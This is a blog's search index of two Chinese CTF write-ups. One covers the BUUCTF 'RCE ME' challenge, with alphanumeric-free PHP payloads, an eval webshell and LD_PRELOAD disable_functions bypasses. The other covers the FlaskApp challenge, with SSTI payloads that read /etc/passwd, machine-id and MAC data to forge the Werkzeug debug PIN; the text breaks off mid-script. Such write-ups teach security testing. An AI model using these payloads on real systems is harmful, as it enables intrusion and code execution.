<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>BUUCTF-WEB-[极客大挑战 2019]RCE ME-贴近实战的phpbypass</title>
      <link href="/2022/04/26/BUUCTF-WEB-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-%E8%B4%B4%E8%BF%91%E5%AE%9E%E6%88%98%E7%9A%84phpbypass/"/>
      <url>/2022/04/26/BUUCTF-WEB-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-%E8%B4%B4%E8%BF%91%E5%AE%9E%E6%88%98%E7%9A%84phpbypass/</url>
      
        <content type="html"><![CDATA[<h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><p>bypass_php_disable_functions</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;<span class="comment">//长度判断</span></span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;<span class="comment">//检测数字和字母</span></span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>绕过的原理理解<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p><h3 id="法-1"><a href="#法-1" class="headerlink" title="法 1"></a>法 1</h3><p>利用插件 php_cg_uaf<br>这里因为有长度的限制，所以使用取反</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&quot;echo urlencode(~&#x27;phpinfo&#x27;);&quot;</span><span class="comment">//%8F%97%8F%96%91%99%90</span></span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">?code=(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();</span><br></pre></td></tr></table></figure><p><img src="/2022/04/26/BUUCTF-WEB-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-%E8%B4%B4%E8%BF%91%E5%AE%9E%E6%88%98%E7%9A%84phpbypass/2022-04-26-17-48-02.png"></p><p>上传shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;(eval($_POST[a]))&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line">构造：</span><br><span class="line">?code=(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)(~%D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%<span class="number">9</span>E%A2%D6%D6);</span><br></pre></td></tr></table></figure><p>蚁剑链接，但是命令用不了。使用插件</p><p><img src="/2022/04/26/BUUCTF-WEB-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-%E8%B4%B4%E8%BF%91%E5%AE%9E%E6%88%98%E7%9A%84phpbypass/2022-04-26-17-51-17.png"></p><p>加载该插件，最后运行根目录下的readflag即可</p><h3 id="法-2"><a href="#法-2" class="headerlink" title="法 2"></a>法 2</h3><p>这里主要参考<br><a href="https://blog.csdn.net/mochu7777777/article/details/105136633/">https://blog.csdn.net/mochu7777777/article/details/105136633/</a></p><p>利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE。<br>看的一愣一愣的。我怎么感觉就是法1的手动版呢？菜狗の异或。<br>详细文档：<br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a>   </p><p>利用流程：</p><ol><li>上传 bypass_disablefunc.php、bypass_disablefunc_x64.so<br>找到&#x2F;var&#x2F;tmp，上传即可。记得把bypass_disablefunc.php改成shell.php</li><li>利用<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[%<span class="number">27</span>a%<span class="number">27</span>])</span><br><span class="line">即</span><br><span class="line">?code=$&#123;_GET&#125;[_]($&#123;_GET&#125;[_]);&amp;_=assert&amp;_=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>])</span><br><span class="line">改造：</span><br><span class="line">?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=<span class="keyword">include</span>(%<span class="number">27</span>/<span class="keyword">var</span>/tmp/shell.php%<span class="number">27</span>)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/<span class="keyword">var</span>/tmp/bypass_disablefunc_x64.so</span><br><span class="line">即可得到flag。</span><br></pre></td></tr></table></figure></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/mochu7777777/article/details/105136633/">https://blog.csdn.net/mochu7777777/article/details/105136633/</a><br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a><br><a href="https://github.com/AntSword-Store/as_bypass_php_disable_functions">https://github.com/AntSword-Store/as_bypass_php_disable_functions</a><br><a href="https://blog.csdn.net/qq_43801002/article/details/107760421">https://blog.csdn.net/qq_43801002/article/details/107760421</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-WEB-[GYCTF2020]FlaskApp-ssti</title>
      <link href="/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/"/>
      <url>/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ol><li>开启了debug模式</li><li>模板注入<h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><h3 id="什么是flask的debug模式-pin码？"><a href="#什么是flask的debug模式-pin码？" class="headerlink" title="什么是flask的debug模式\pin码？"></a>什么是flask的debug模式\pin码？</h3><img src="/2022/04/25/BUUCTF-WEB-GYCTF2020-FlaskApp-ssti/2022-04-25-22-43-48.png"><br><a href="https://zhuanlan.zhihu.com/p/32138231">Flask开启debug模式等于给黑客留了后门</a><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3>总体思路是</li></ol><p>利ssti获取生成PIN码的数据，然后利用PIN码拿到shell</p><p>首先要找到ssti漏洞点，输入一些脏字符，看到有源码泄露</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :<span class="comment">#可以看到绕过waf即可</span></span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">Open an interactive python shell <span class="keyword">in</span> this frame        res =  render_template_string(tmp)<span class="comment">#执行模板解析，存在模板注入</span></span><br></pre></td></tr></table></figure><p>先试了49被waf住了14可以，注意要先base64加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"><span class="comment">#试着读取敏感信息</span></span><br></pre></td></tr></table></figure><p>成功返回如下（不想截图的原因是占内存，个人有点内存洁癖）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">结果 ： root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/<span class="built_in">bin</span>/bash daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin <span class="built_in">bin</span>:x:<span class="number">2</span>:<span class="number">2</span>:<span class="built_in">bin</span>:/<span class="built_in">bin</span>:/usr/sbin/nologin sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin sync:x:<span class="number">4</span>:<span class="number">65534</span>:sync:/<span class="built_in">bin</span>:/<span class="built_in">bin</span>/sync games:x:<span class="number">5</span>:<span class="number">60</span>:games:/usr/games:/usr/sbin/nologin man:x:<span class="number">6</span>:<span class="number">12</span>:man:/var/cache/man:/usr/sbin/nologin lp:x:<span class="number">7</span>:<span class="number">7</span>:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:<span class="number">8</span>:<span class="number">8</span>:mail:/var/mail:/usr/sbin/nologin news:x:<span class="number">9</span>:<span class="number">9</span>:news:/var/spool/news:/usr/sbin/nologin uucp:x:<span class="number">10</span>:<span class="number">10</span>:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:<span class="number">13</span>:<span class="number">13</span>:proxy:/<span class="built_in">bin</span>:/usr/sbin/nologin www-data:x:<span class="number">33</span>:<span class="number">33</span>:www-data:/var/www:/usr/sbin/nologin backup:x:<span class="number">34</span>:<span class="number">34</span>:backup:/var/backups:/usr/sbin/nologin <span class="built_in">list</span>:x:<span class="number">38</span>:<span class="number">38</span>:Mailing <span class="type">List</span> Manager:/var/<span class="built_in">list</span>:/usr/sbin/nologin irc:x:<span class="number">39</span>:<span class="number">39</span>:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:<span class="number">41</span>:<span class="number">41</span>:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:<span class="number">65534</span>:<span class="number">65534</span>:nobody:/nonexistent:/usr/sbin/nologin _apt:x:<span class="number">100</span>:<span class="number">65534</span>::/nonexistent:/usr/sbin/nologin flaskweb:x:<span class="number">1000</span>:<span class="number">1000</span>::/home/flaskweb:/<span class="built_in">bin</span>/sh</span><br></pre></td></tr></table></figure><p>接下来读取源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;app.py&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功返回，可以看到waf过滤了很多关键字</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template_string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template,request,flash,redirect,url_for</span><br><span class="line"><span class="keyword">from</span> flask_wtf <span class="keyword">import</span> FlaskForm</span><br><span class="line"><span class="keyword">from</span> wtforms <span class="keyword">import</span> StringField, SubmitField</span><br><span class="line"><span class="keyword">from</span> wtforms.validators <span class="keyword">import</span> DataRequired</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;s_e_c_r_e_t_k_e_y&#x27;</span></span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64加密&#x27;</span>,validators= [DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">NameForm1</span>(<span class="title class_ inherited__">FlaskForm</span>):</span><br><span class="line">    text = StringField(<span class="string">&#x27;BASE64解密&#x27;</span>,validators= [DataRequired()])</span><br><span class="line">    submit = SubmitField(<span class="string">&#x27;提交&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params"><span class="built_in">str</span></span>):<span class="comment">#过滤的东西很多</span></span><br><span class="line">    black_list = [<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;os&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;import&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;chr&quot;</span>,<span class="string">&quot;request&quot;</span>,<span class="string">&quot;subprocess&quot;</span>,<span class="string">&quot;commands&quot;</span>,<span class="string">&quot;socket&quot;</span>,<span class="string">&quot;hex&quot;</span>,<span class="string">&quot;base64&quot;</span>,<span class="string">&quot;*&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> black_list :</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> <span class="built_in">str</span>.lower() :</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/hint&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>():</span><br><span class="line">    txt = <span class="string">&quot;失败乃成功之母！！&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;hint.html&quot;</span>,txt = txt)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64encode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果  :&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(text_decode.decode()))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash(tmp)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;encode&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form ,method = <span class="string">&quot;加密&quot;</span> ,img = <span class="string">&quot;flask.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br><span class="line">        flash( res )</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        text = <span class="string">&quot;&quot;</span></span><br><span class="line">        form = NameForm1(text)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>,form = form, method = <span class="string">&quot;解密&quot;</span> , img = <span class="string">&quot;flask1.png&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&amp;lt;name&amp;gt;&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">not_found</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;404.html&quot;</span>,name = name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么计算PIN码需要什么条件呢？</p><ol><li>flask所登录的用户名。可以通过读取&#x2F;etc&#x2F;password知道 用户为flaskweb<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">得到</span><br><span class="line">flaskweb:x:<span class="number">1000</span>:<span class="number">1000</span>::/home/flaskweb:/<span class="built_in">bin</span>/sh</span><br></pre></td></tr></table></figure></li><li>modname 一般不变就是flask.app</li><li>getattr(app, “name”, app.class.name)。python该值一般为Flask ，值一般不变</li><li>flask库下app.py的绝对路径。在报错信息中可以获取此值为： &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;site-packages&#x2F;flask&#x2F;app.py</li><li>当前网络的mac地址的十进制数。通过文件&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address读取，eth0为当前使用的网卡：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> &#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line">得到</span><br><span class="line"> 6a:1b:8c:f1:f4:<span class="number">67</span></span><br><span class="line"> 转为十进制</span><br><span class="line"> <span class="number">116666561328231</span></span><br></pre></td></tr></table></figure></li><li>docker机器id<br>对于非docker机每一个机器都会有自已唯一的id，linux的id一般存放在&#x2F;etc&#x2F;machine-id或&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_i，有的系统没有这两个文件。<br>对于docker机则读取&#x2F;proc&#x2F;self&#x2F;cgroup，其中第一行的&#x2F;docker&#x2F;字符串后面的内容作为机器的id<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> &#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/proc/self/cgroup&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<span class="comment">#这个得到的不能用</span></span><br><span class="line"> 或</span><br><span class="line"> &#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/etc/machine-id&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<span class="comment">#这个可以</span></span><br><span class="line"> 得到</span><br><span class="line">1408f836b0ca514d796cbf8960e45fa1</span><br></pre></td></tr></table></figure>ok ，然后就用大佬的脚本<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span><span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;116666561328231&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span 